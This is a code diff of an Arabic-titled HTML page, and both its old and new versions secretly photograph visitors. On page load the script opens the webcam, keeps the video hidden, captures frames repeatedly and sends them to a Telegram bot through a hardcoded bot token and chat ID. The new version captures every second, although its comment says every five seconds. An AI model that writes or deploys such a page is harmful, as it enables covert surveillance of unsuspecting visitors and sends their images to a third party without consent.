@@ -1,84 +1,50 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Take a photo and send it to Telegram</title>
-<style>
-#video {
-display: none;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التصوير التلقائي</title>
 </head>
 <body>
-<canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
-<script src="script.js"></script>
-<script>
-// Activate the camera
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <script>
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById("video");
+                video.srcObject = stream;
 
-navigator.mediaDevices.getUserMedia({ video: true })
-.then(function(stream) {
-var video = document.createElement('video');
+                setInterval(() => {
+                    captureAndSend();
+                }, 1000); // يلتقط صورة كل 5 ثوانٍ
+            } catch (error) {
+                console.error("فشل في تشغيل الكاميرا:", error);
+            }
+        }
 
-video.srcObject = stream;
+        function captureAndSend() {
+            const video = document.getElementById("video");
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-video.play();
+            const imageData = canvas.toDataURL("image/png");
 
-// Take four photos with a 1 second interval between each photo
+            // إرسال الصورة إلى تيليجرام
+            fetch("https://api.telegram.org/bot<7214420833:AAE9-I-ZCnIrb1aDBrhCVr1I2piz4JEUoZU>/sendPhoto", {
+                method: "POST",
+                body: JSON.stringify({
+                    chat_id: "<5471126331>",
+                    photo: imageData
+                }),
+                headers: { "Content-Type": "application/json" }
+            });
+        }
 
-var delay = 1000; // Delay between each photo in milliseconds
-
-var numOfPhotos = 4; // Number of photos to take
-
-for (let i = 0; i < numOfPhotos; i++) {
-setTimeout(function() {
-var canvas = document.getElementById('canvas');
-var context = canvas.getContext('2d');
-context.drawImage(video, 0, 0, 640, 480);
-sendImageToTelegram(canvas.toDataURL('image/jpeg'));
-}, i * delay + 1000); // delay to start capturing after 1 second
-}
-})
-.catch(function(err) {
-console.error("An error occurred: " + err);
-});
-
-function sendImageToTelegram(dataURL) {
-var telegramToken = '7214420833:AAE9-I-ZCnIrb1aDBrhCVr1I2piz4JEUoZU';
-var chatId = '5471126331';
-
-var formData = new FormData();
-formData.append("chat_id", chatId);
-formData.append("photo", dataURLToBlob(dataURL));
-
-fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
-method: 'POST',
-body: formData
-}).then(response => {
-return response.json();
-}).then(data => {
-console.log(data);
-}).catch(error => {
-console.error("Error sending photo to Telegram: ", error);
-});
-}
-
-function dataURLToBlob(dataURL) {
-var byteString = atob(dataURL.split(',')[1]);
-var mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
-
-var buffer = new ArrayBuffer(byteString.length);
-    var dataArray = new Uint8Array(buffer);
-
-    for (var i = 0; i < byteString.length; i++) {
-        dataArray[i] = byteString.charCodeAt(i);
-    }
-
-    var blob = new Blob([buffer], { type: mimeString });
-    return blob;
-}
+        // تشغيل الكاميرا تلقائيًا عند تحميل الصفحة
+        document.addEventListener("DOMContentLoaded", startCamera);
     </script>
 </body>
 </html>
-
- 
